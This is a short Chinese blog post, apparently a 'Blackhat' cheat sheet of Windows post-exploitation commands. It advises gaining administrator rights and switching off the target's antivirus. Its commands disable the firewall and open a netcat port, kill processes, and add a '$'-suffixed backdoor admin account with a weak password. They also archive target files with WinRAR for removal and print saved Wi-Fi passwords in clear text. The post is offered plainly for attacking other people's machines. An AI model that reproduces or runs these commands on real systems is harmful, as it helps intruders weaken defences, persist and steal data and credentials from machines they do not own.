---
title: 在渗透后非常有用的windows命令整理
name: windows-useful-cmds
date: 2017-10-29
tags: [cmd]
categories: [Blackhat]
---

* 目录
{:toc}

---

# 在渗透后非常有用的windows命令整理

## 注意事项

以下整理的命令不一定在所有windows平台适用，如win10版本等高版本的系统会被拒绝访问，某些杀毒软件会弹出提示框显示授权操作，所以建议是拿到超级管理员权限，且将目标主机的杀毒软件卸载或者关闭。

## 命令明细

```
# 关闭防火墙
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable

# 添加防火墙出入站规则（关闭防火墙失败的情况）
netsh advfirewall firewall add rule name='netcat' dir=in action=allow protocol=Tcp localport=4445
# 检查查看防火墙配置的出入站规则
netsh firewall show portopening

# 查看进程杀死进程
tasklist
tskill 6486

# 创建用户并添加到管理员组
net user vinny$ 123321 /add
net localgroup administrators vinny$ /add

# 删除目标用户或者密码
net user vinny$ *
net user vinny$ /delete

# 压缩文件夹或者文件（目标系统安装好winrar的情况）
"%ProgramFiles%\Winrar\rar" a -ag -k -r -s -ibck a.rar "SAP BYD资料"
"%ProgramFiles%\Winrar\rar" a -ag -k -r -s -ibck a.rar 1.txt 2.txt

# 查看目标机器保存的无线热点和密码
netsh wlan show profile
netsh wlan show profile name="menote2" key=clear
```